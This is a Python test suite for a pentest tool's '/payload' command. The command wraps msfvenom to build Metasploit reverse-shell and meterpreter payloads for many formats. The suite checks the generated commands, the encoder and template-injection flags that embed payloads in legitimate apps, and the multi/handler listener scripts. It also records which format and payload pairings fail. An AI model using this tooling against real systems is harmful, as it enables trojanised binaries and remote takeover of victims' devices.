"""Regression suite for `/payload`.

Run:  python tests/test_payload.py   (from an activated venv)

Two layers, matching the split in ``zimzilla/payload.py`` itself:

* **the table and the argv** — pure functions, no terminal, no model, and no
  build. Every spec is checked for the shape the builder depends on, and the
  argv is checked against the traps that make this table worth having;
* **the wiring** — that the slash dispatch, help table, palette and completion
  menu all expose the command, so a rename in one place cannot orphan it in
  another.

The third layer is the one that matters most and is **skipped when msfvenom is
not installed**: a real build of every spec in the table, and of every
alternative it offers. That is the test that proves the table is true rather
than plausible. It is slow — 38 builds at ~4s each — so it is opt-in:

    ZIMZILLA_PAYLOAD_BUILD=1 python tests/test_payload.py

The traps this file pins, each of which was measured on a real msfvenom and
each of which a "cleanup" would plausibly undo:

* ``-f apk`` is an error. The APK spec must carry ``format=None``.
* ``-f elf-so`` and ``-f raw`` refuse a *stageless* meterpreter payload.
* ``-f hta-psh`` overflows on a meterpreter payload; the spec uses a shell.
* ``-f js_be`` is refused for an x64 payload.
* ``-f java`` is refused for a java/* payload.
* ``-f axis2`` refuses a jsp payload.
* ``-f osx-app`` refuses a stageless meterpreter payload.
"""

from __future__ import annotations

import atexit
import os
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

# A throwaway ZIMZILLA_HOME for the whole suite. ``Config.state_dir`` defaults
# to ~/.zimzilla and is resolved at import time, so this has to be set before
# the imports below. Without it every case directory this suite builds lands in
# the operator's live install — which is exactly what happened on the first run
# of this file, and is the bug `test_crack.py` records in the same place.
_TEST_HOME = Path(tempfile.mkdtemp(prefix="zim-test-home-"))
os.environ["ZIMZILLA_HOME"] = str(_TEST_HOME)
atexit.register(shutil.rmtree, _TEST_HOME, ignore_errors=True)

from zimzilla import payload as pl  # noqa: E402
from zimzilla.config import Config  # noqa: E402
from zimzilla.ui.app import ZimZillaApp, _parse_payload_args  # noqa: E402
from zimzilla.ui.complete import SLASH_COMMANDS  # noqa: E402

RESULTS: list[tuple[str, bool, str]] = []


def check(name: str, ok: bool, extra: str = "") -> None:
    RESULTS.append((name, ok, extra))
    print(f"{'PASS' if ok else 'FAIL'}  {name}  {extra}")


def skip(name: str, why: str) -> None:
    RESULTS.append((name, True, f"SKIP — {why}"))
    print(f"SKIP  {name}  {why}")


def _cfg(workdir: Path, **kw) -> Config:
    return Config.from_env(workdir=workdir, api_key="x",
                           base_url="http://localhost:4001", **kw)


# ---------------------------------------------------------------------------
# the table
# ---------------------------------------------------------------------------


def test_table_shape() -> None:
    check("table: every spec has a payload id",
          all(s.payload for s in pl.SPECS.values()))
    check("table: every spec has a label",
          all(s.label for s in pl.SPECS.values()))
    check("table: every spec says what runs it",
          all(s.runs_on for s in pl.SPECS.values()))
    check("table: keys match their ext field",
          all(k == s.ext for k, s in pl.SPECS.items()),
          ", ".join(k for k, s in pl.SPECS.items() if k != s.ext))

    # LIST_ORDER drives the listing, so a spec missing from it is a spec the
    # operator cannot discover. Both directions are checked: an entry in the
    # order with no spec would render a blank row.
    missing = [e for e in pl.SPECS if e not in pl.LIST_ORDER]
    check("table: every spec is in LIST_ORDER", not missing, ", ".join(missing))
    extra = [e for e in pl.LIST_ORDER if e not in pl.SPECS]
    check("table: LIST_ORDER names no missing spec", not extra, ", ".join(extra))
    check("table: extensions() covers the table",
          set(pl.extensions()) == set(pl.SPECS),
          f"{len(pl.extensions())} vs {len(pl.SPECS)}")

    # An alias pointing at a spec that does not exist is a dead end that only
    # shows up when someone types it.
    dead = [a for a, t in pl.ALIASES.items() if t not in pl.SPECS]
    check("table: every alias resolves", not dead, ", ".join(dead))
    # An alias that shadows a real extension would make that extension
    # unreachable by name.
    shadow = [a for a in pl.ALIASES if a in pl.SPECS]
    check("table: no alias shadows an extension", not shadow, ", ".join(shadow))


def test_resolve() -> None:
    check("resolve: bare extension", pl.resolve("apk") is pl.SPECS["apk"])
    check("resolve: leading dot", pl.resolve(".apk") is pl.SPECS["apk"])
    check("resolve: uppercase", pl.resolve("APK") is pl.SPECS["apk"])
    check("resolve: a filename", pl.resolve("app.apk") is pl.SPECS["apk"])
    check("resolve: a path", pl.resolve("/tmp/x/app.apk") is pl.SPECS["apk"])
    check("resolve: a windows path",
          pl.resolve(r"C:\tmp\app.apk") is pl.SPECS["apk"])
    check("resolve: quoted", pl.resolve('"app.apk"') is pl.SPECS["apk"])
    check("resolve: an alias", pl.resolve("android") is pl.SPECS["apk"])
    check("resolve: an alias for a script", pl.resolve("bash") is pl.SPECS["sh"])
    check("resolve: unknown is None", pl.resolve("nope") is None)
    check("resolve: empty is None", pl.resolve("") is None)
    check("resolve: whitespace is None", pl.resolve("   ") is None)
    # A dotfile has no extension to take, and stripping the dot would turn
    # `.bashrc` into `bashrc` — which is not a format.
    check("resolve: a dotfile is not an extension",
          pl.resolve(".bashrc") is None)


def test_the_traps() -> None:
    """The pairings that do not work, pinned so they cannot be 'fixed' back."""
    # `msfvenom -f apk` is `Error: invalid format: apk`. The payload emits the
    # container; passing -f at all is the bug.
    check("trap: apk carries no -f", pl.SPECS["apk"].format is None)
    argv = pl.build_argv(pl.SPECS["apk"], lhost="1.2.3.4", lport=4444,
                         out=Path("x.apk"))
    check("trap: apk argv has no -f", "-f" not in argv, " ".join(argv))

    # A stageless meterpreter payload is refused for elf-so and raw.
    check("trap: so is staged, not stageless",
          pl.SPECS["so"].payload == "linux/x64/meterpreter/reverse_tcp",
          pl.SPECS["so"].payload)
    check("trap: bin is staged, not stageless",
          pl.SPECS["bin"].payload == "linux/x64/meterpreter/reverse_tcp",
          pl.SPECS["bin"].payload)
    check("trap: app is not a stageless meterpreter",
          "meterpreter_reverse" not in pl.SPECS["app"].payload,
          pl.SPECS["app"].payload)

    # hta-psh overflows the 8192-char command line on a meterpreter payload.
    check("trap: hta uses a shell payload",
          pl.SPECS["hta"].payload.endswith("shell_reverse_tcp"),
          pl.SPECS["hta"].payload)

    # `-f java` is refused for a java/* payload.
    check("trap: jar is not -f java", pl.SPECS["jar"].format != "java",
          str(pl.SPECS["jar"].format))
    # `-f axis2` refuses a jsp payload.
    check("trap: axis2 uses a java payload",
          pl.SPECS["axis2"].payload.startswith("java/"),
          pl.SPECS["axis2"].payload)
    check("trap: axis2 is not the jsp payload",
          pl.SPECS["axis2"].payload != "java/jsp_shell_reverse_tcp")

    # js_be is refused for an x64 payload; the spec must not name it.
    check("trap: no spec uses js_be",
          all(s.format != "js_be" for s in pl.SPECS.values()))


def test_build_argv() -> None:
    spec = pl.SPECS["exe"]
    argv = pl.build_argv(spec, lhost="10.0.0.5", lport=443, out=Path("p.exe"))
    check("argv: starts with msfvenom", argv[0] == "msfvenom", argv[0])
    check("argv: carries -p", "-p" in argv and spec.payload in argv)
    check("argv: carries LHOST", "LHOST=10.0.0.5" in argv)
    check("argv: carries LPORT", "LPORT=443" in argv)
    check("argv: carries -f", "-f" in argv and "exe" in argv)
    check("argv: carries -o", "-o" in argv and "p.exe" in argv)

    # The APK case: no -f at all, and the payload is what makes it an APK.
    apk = pl.build_argv(pl.SPECS["apk"], lhost="1.1.1.1", lport=4444,
                        out=Path("p.apk"))
    check("argv: apk omits -f entirely", "-f" not in apk, " ".join(apk))

    # Encoder and iterations travel together, and iterations alone is
    # meaningless — msfvenom ignores -i without -e.
    enc = pl.build_argv(spec, lhost="1.1.1.1", lport=4444, out=Path("p.exe"),
                        encoder="x64/xor_dynamic", iterations=3)
    check("argv: encoder", "-e" in enc and "x64/xor_dynamic" in enc)
    check("argv: iterations", "-i" in enc and "3" in enc)

    bad = pl.build_argv(spec, lhost="1.1.1.1", lport=4444, out=Path("p.exe"),
                        bad_chars="\\x00\\x0a")
    check("argv: bad chars", "-b" in bad and "\\x00\\x0a" in bad)

    # -k only where it is meaningful: PE. A -k on a format that does not
    # support it is a build error, not a no-op.
    tmpl = pl.build_argv(spec, lhost="1.1.1.1", lport=4444, out=Path("p.exe"),
                         template=Path("app.exe"))
    check("argv: template", "-x" in tmpl and "app.exe" in tmpl)
    check("argv: -k for PE", "-k" in tmpl)
    apk_t = pl.build_argv(pl.SPECS["apk"], lhost="1.1.1.1", lport=4444,
                          out=Path("p.apk"), template=Path("app.apk"))
    check("argv: no -k for APK", "-k" not in apk_t, " ".join(apk_t))

    # A payload override replaces the default and nothing else.
    over = pl.build_argv(spec, lhost="1.1.1.1", lport=4444, out=Path("p.exe"),
                         payload="windows/x64/shell_reverse_tcp")
    check("argv: payload override",
          "windows/x64/shell_reverse_tcp" in over and spec.payload not in over)


def test_quoting() -> None:
    check("quote: plain arg untouched", pl._quote("abc") == "abc")
    check("quote: a path with a space", pl._quote("/tmp/a b") == "'/tmp/a b'")
    check("quote: an embedded quote",
          pl._quote("it's") == "'it'\\''s'")
    check("quote: empty", pl._quote("") == "''")
    # A bad-chars value is full of backslashes and must survive a copy-paste.
    check("quote: bad chars survive",
          pl._quote("\\x00\\x0a") == "'\\x00\\x0a'")


def test_handler() -> None:
    rc = pl.handler_rc(pl.SPECS["apk"], "10.0.0.5", 4444)
    check("handler: uses multi/handler", f"use {pl.LISTENER}" in rc)
    check("handler: sets the payload",
          "set payload android/meterpreter/reverse_tcp" in rc)
    check("handler: sets LHOST", "set LHOST 10.0.0.5" in rc)
    check("handler: sets LPORT", "set LPORT 4444" in rc)
    # A handler that exits after one session needs a second console for a
    # second target, which defeats the point of a handler.
    check("handler: does not exit on session", "set ExitOnSession false" in rc)
    check("handler: runs in the background", "exploit -j" in rc)
    # An override must reach the handler too, or the listener catches a
    # payload that was never built.
    over = pl.handler_rc(pl.SPECS["exe"], "1.1.1.1", 443,
                         "windows/x64/shell_reverse_tcp")
    check("handler: honours the payload override",
          "set payload windows/x64/shell_reverse_tcp" in over)


def test_case_dir(tmp: Path) -> None:
    cfg = _cfg(tmp)
    case = pl.case_dir(cfg, pl.SPECS["apk"])
    check("case: created", case.is_dir(), str(case))
    check("case: under state_dir/payload",
          case.parent == Path(cfg.state_dir) / "payload", str(case.parent))
    check("case: named for the extension", case.name.startswith("apk-"),
          case.name)
    # Two runs in the same second must not collide, or the second build
    # overwrites the first.
    other = pl.case_dir(cfg, pl.SPECS["exe"])
    check("case: different extensions differ", other != case)


def test_output_name() -> None:
    check("name: apk", pl.output_name(pl.SPECS["apk"]) == "payload.apk")
    check("name: exe", pl.output_name(pl.SPECS["exe"]) == "payload.exe")
    # The name follows the extension, not the payload id — the file is what
    # gets delivered.
    check("name: ignores the payload id",
          pl.output_name(pl.SPECS["apk"], "android/shell/reverse_tcp")
          == "payload.apk")


def test_apktool_gate() -> None:
    """The APK template gate, driven with fabricated versions.

    msfvenom requires apktool >= 2.9.2 for `-x` on an APK and fails the build
    rather than degrading, so the check has to happen before the build. Debian
    ships 2.7.0, which is what this was measured against.
    """
    old = pl.Tool("apktool", "/usr/bin/apktool", "2.7.0-dirty")
    ok, why = pl.apktool_supports_template(old)
    check("apktool: 2.7.0 is refused", not ok, why)
    check("apktool: the reason names the version", "2.7.0" in why, why)

    new = pl.Tool("apktool", "/usr/bin/apktool", "2.9.2")
    ok, why = pl.apktool_supports_template(new)
    check("apktool: 2.9.2 is accepted", ok, why)

    newer = pl.Tool("apktool", "/usr/bin/apktool", "2.10.0")
    ok, _ = pl.apktool_supports_template(newer)
    check("apktool: 2.10.0 is accepted", ok)

    missing = pl.Tool("apktool", None)
    ok, why = pl.apktool_supports_template(missing)
    check("apktool: absent is refused", not ok, why)

    junk = pl.Tool("apktool", "/usr/bin/apktool", "version unknown")
    ok, why = pl.apktool_supports_template(junk)
    check("apktool: unreadable version is refused", not ok, why)


def test_default_lhost() -> None:
    lhost = pl.default_lhost()
    check("lhost: is a dotted quad",
          lhost.count(".") == 3 and all(p.isdigit() for p in lhost.split(".")),
          lhost)
    # A loopback default is the honest answer when there is no route, but it
    # must never be an empty string — an empty LHOST builds a payload that
    # calls back nowhere.
    check("lhost: never empty", bool(lhost))


def test_error_parsing() -> None:
    """msfvenom prefixes informational lines with `[-]` too."""
    noise = (
        "[-] No platform was selected, choosing Msf::Module::Platform::Linux\n"
        "[-] No arch selected, selecting arch: x64 from the payload\n"
        "No encoder specified, outputting raw payload\n"
        "Error: selected payload can only generate ELF files\n"
    )
    got = pl._first_error(noise)
    check("error: picks the Error line, not the noise",
          got == "selected payload can only generate ELF files", got)
    check("error: empty input", pl._first_error("") == "")
    check("error: no error line", pl._first_error("all fine\n") == "")


# ---------------------------------------------------------------------------
# the command wiring
# ---------------------------------------------------------------------------


def test_parse_args() -> None:
    opts, err = _parse_payload_args(["apk"])
    check("parse: bare extension", opts["ext"] == "apk" and not err, err)
    check("parse: default port", opts["lport"] == pl.DEFAULT_LPORT)

    opts, err = _parse_payload_args(["apk", "--dry-run"])
    check("parse: --dry-run", opts["dry_run"] and not err, err)

    opts, err = _parse_payload_args(["apk", "--handler"])
    check("parse: --handler", opts["handler_only"] and not err, err)

    opts, err = _parse_payload_args(["apk", "--lport", "5555"])
    check("parse: --lport", opts["lport"] == 5555 and not err, err)

    opts, err = _parse_payload_args(["apk", "--lport=443"])
    check("parse: --lport= form", opts["lport"] == 443 and not err, err)

    # A bad port must be refused, not silently defaulted: a payload calling
    # back to the wrong port is a failure that only shows up at delivery.
    opts, err = _parse_payload_args(["apk", "--lport", "x"])
    check("parse: non-numeric port refused", bool(err), err)
    opts, err = _parse_payload_args(["apk", "--lport", "99999"])
    check("parse: out-of-range port refused", bool(err), err)
    opts, err = _parse_payload_args(["apk", "--lport", "0"])
    check("parse: port 0 refused", bool(err), err)

    opts, err = _parse_payload_args(["apk", "--bogus"])
    check("parse: unknown flag refused", bool(err), err)
    opts, err = _parse_payload_args(["apk", "extra"])
    check("parse: extra argument refused", bool(err), err)
    opts, err = _parse_payload_args([])
    check("parse: no extension refused", bool(err), err)

    opts, err = _parse_payload_args(
        ["apk", "--lhost", "1.2.3.4", "--payload", "android/shell/reverse_tcp",
         "--encoder", "x64/xor", "--iterations", "3", "--bad-chars", "\\x00",
         "--template", "t.apk", "--out", "/tmp/x.apk"])
    check("parse: every valued flag", not err, err)
    check("parse: lhost", opts["lhost"] == "1.2.3.4")
    check("parse: payload", opts["payload"] == "android/shell/reverse_tcp")
    check("parse: encoder", opts["encoder"] == "x64/xor")
    check("parse: iterations", opts["iterations"] == 3)
    check("parse: bad chars", opts["bad_chars"] == "\\x00")
    check("parse: template", opts["template"] == "t.apk")
    check("parse: out", opts["out"] == "/tmp/x.apk")

    opts, err = _parse_payload_args(["apk", "--iterations", "x"])
    check("parse: non-numeric iterations refused", bool(err), err)


def test_wiring() -> None:
    check("wiring: dispatch has /payload",
          hasattr(ZimZillaApp, "_cmd_payload"))
    check("wiring: the builder exists", hasattr(ZimZillaApp, "_build_payload"))
    check("wiring: the renderer exists",
          hasattr(ZimZillaApp, "_render_payload_analysis"))
    check("wiring: the list exists", hasattr(ZimZillaApp, "_payload_list"))
    check("wiring: /payload answers while busy",
          "payload" in ZimZillaApp.BUSY_OK)
    check("wiring: completion offers /payload",
          any(c == "/payload" for c, _ in SLASH_COMMANDS))
    # The usage lines are what `/payload` with no argument shows, so an empty
    # tuple would render a blank panel.
    check("wiring: usage lines exist", len(pl.USAGE_LINES) >= 5,
          str(len(pl.USAGE_LINES)))


def test_cli_list() -> None:
    """The CLI's `list` verb, run as a subprocess so it is the real entry."""
    proc = subprocess.run(
        [sys.executable, "-m", "zimzilla.payload", "list"],
        capture_output=True, text=True, cwd=str(ROOT), timeout=60,
    )
    check("cli: list exits 0", proc.returncode == 0, proc.stderr[:200])
    check("cli: list names apk", "apk" in proc.stdout)
    check("cli: list names exe", "exe" in proc.stdout)
    check("cli: list names php", "php" in proc.stdout)
    # Every extension in the table must appear, or the CLI and the TUI
    # disagree about what can be built.
    missing = [e for e in pl.extensions() if e not in proc.stdout]
    check("cli: list covers the table", not missing, ", ".join(missing))


def test_cli_dry_run() -> None:
    proc = subprocess.run(
        [sys.executable, "-m", "zimzilla.payload", "apk", "--dry-run",
         "--lhost", "10.0.0.5", "--lport", "443"],
        capture_output=True, text=True, cwd=str(ROOT), timeout=60,
    )
    check("cli: dry-run exits 0", proc.returncode == 0, proc.stderr[:200])
    check("cli: dry-run prints msfvenom", "msfvenom" in proc.stdout)
    check("cli: dry-run carries LHOST", "LHOST=10.0.0.5" in proc.stdout)
    check("cli: dry-run carries LPORT", "LPORT=443" in proc.stdout)
    check("cli: dry-run omits -f for apk", " -f " not in proc.stdout,
          proc.stdout.strip())


def test_cli_unknown() -> None:
    proc = subprocess.run(
        [sys.executable, "-m", "zimzilla.payload", "nope"],
        capture_output=True, text=True, cwd=str(ROOT), timeout=60,
    )
    check("cli: unknown extension exits non-zero", proc.returncode != 0)
    check("cli: unknown extension says so", "unknown extension" in proc.stderr,
          proc.stderr[:120])


# ---------------------------------------------------------------------------
# the real builds — opt-in, because they are slow
# ---------------------------------------------------------------------------


def test_real_builds() -> None:
    """Build every spec, and every alternative, with the real msfvenom.

    This is the test that proves the table. It is skipped unless
    ``ZIMZILLA_PAYLOAD_BUILD=1``, because 38 builds at ~4s each is a minute and
    a half of a suite that otherwise runs in under a second.
    """
    if os.environ.get("ZIMZILLA_PAYLOAD_BUILD") != "1":
        skip("build: every spec builds", "set ZIMZILLA_PAYLOAD_BUILD=1")
        skip("build: every alternative builds", "set ZIMZILLA_PAYLOAD_BUILD=1")
        return
    if shutil.which("msfvenom") is None:
        skip("build: every spec builds", "msfvenom is not installed")
        skip("build: every alternative builds", "msfvenom is not installed")
        return

    with tempfile.TemporaryDirectory() as d:
        tmp = Path(d)
        failed: list[str] = []
        for ext in pl.extensions():
            spec = pl.SPECS[ext]
            out = tmp / pl.output_name(spec)
            b = pl.generate(spec, lhost="127.0.0.1", lport=4444, out=out,
                            timeout=180)
            if not b.ok:
                failed.append(f"{ext}: {b.error}")
        check("build: every spec builds", not failed, "; ".join(failed))

        failed = []
        for ext in pl.extensions():
            spec = pl.SPECS[ext]
            for alt in spec.alternatives:
                out = tmp / f"{ext}-alt.{ext}"
                b = pl.generate(spec, lhost="127.0.0.1", lport=4444, out=out,
                                payload=alt, timeout=180)
                if not b.ok:
                    failed.append(f"{ext}/{alt}: {b.error}")
        check("build: every alternative builds", not failed, "; ".join(failed))


# ---------------------------------------------------------------------------
# main
# ---------------------------------------------------------------------------


def main() -> int:
    test_table_shape()
    test_resolve()
    test_the_traps()
    test_build_argv()
    test_quoting()
    test_handler()
    test_output_name()
    test_apktool_gate()
    test_default_lhost()
    test_error_parsing()
    test_parse_args()
    test_wiring()
    test_cli_list()
    test_cli_dry_run()
    test_cli_unknown()
    with tempfile.TemporaryDirectory() as d:
        test_case_dir(Path(d))
    test_real_builds()

    failed = [n for n, ok, _ in RESULTS if not ok]
    print(f"\n{len(RESULTS) - len(failed)}/{len(RESULTS)} passed")
    return 1 if failed else 0


if __name__ == "__main__":
    raise SystemExit(main())
